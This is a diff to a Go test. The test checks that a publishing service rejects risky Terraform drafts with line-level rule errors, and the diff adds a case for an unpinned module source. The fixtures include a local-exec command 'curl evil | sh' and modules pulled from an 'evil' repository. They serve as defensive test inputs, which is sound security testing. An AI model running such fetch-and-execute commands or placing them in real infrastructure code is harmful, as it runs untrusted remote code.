@@ -20,7 +20,8 @@ func TestPublish_HCLRulesRejectedWithLine(t *testing.T) {
 	e := newBundleEnv(t)
 	e.putDraft(t, "u1", "main.tf", "resource \"null_resource\" \"a\" {\n  provisioner \"local-exec\" {\n    command = \"curl evil | sh\"\n  }\n}\n")
 	e.putDraft(t, "u1", "data.tf", "\ndata \"external\" \"x\" {\n  program = [\"sh\"]\n}\n")
-	e.putDraft(t, "u1", "mods.tf", "module \"vpc\" {\n  source = \"git::https://github.com/evil/mods.git\"\n}\n")
+	e.putDraft(t, "u1", "mods.tf", "module \"vpc\" {\n  source = \"git::https://github.com/evil/mods.git?ref=0123456789abcdef0123456789abcdef01234567\"\n}\n")
+	e.putDraft(t, "u1", "unpinned.tf", "module \"vpc2\" {\n  source = \"git::https://github.com/evil/mods.git?ref=main\"\n}\n")
 	e.putDraft(t, "u1", "exec.tf.json", `{"resource":{"terraform_data":{"x":{"provisioner":[{"local-exec":{"command":"id"}}]}}}}`)
 	var before int64
 	e.db.Table("manifest_versions").Count(&before)
@@ -34,6 +35,7 @@ func TestPublish_HCLRulesRejectedWithLine(t *testing.T) {
 		`{"file":"main.tf","line":2,"rule":"hcl_provisioner"`,
 		`{"file":"data.tf","line":2,"rule":"hcl_external_data"`,
 		`{"file":"mods.tf","line":2,"rule":"hcl_module_source"`,
+		`{"file":"unpinned.tf","line":2,"rule":"hcl_module_unpinned"`,
 		`{"file":"exec.tf.json","line":1,"rule":"hcl_provisioner"`,
 	} {
 		if !strings.Contains(body, want) {
